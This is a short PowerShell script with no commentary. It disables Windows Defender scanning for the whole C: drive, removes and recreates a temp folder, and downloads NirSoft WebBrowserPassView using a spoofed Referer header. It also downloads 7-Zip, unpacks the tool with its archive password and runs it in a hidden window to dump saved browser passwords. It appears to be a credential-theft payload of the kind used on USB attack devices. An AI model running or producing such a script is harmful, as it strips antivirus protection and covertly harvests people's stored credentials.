Add-MpPreference -ExclusionPath “C:”

rm -r \temp
mkdir \temp
cd \temp
Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
Expand-Archive 7z.zip
.\7z\7za.exe e -p'wbpv28821@' wbpv.zip
Start-Sleep -Seconds 5
Start-Process -FilePath .\WebBrowserPassView.exe -Wait -WindowStyle Hidden
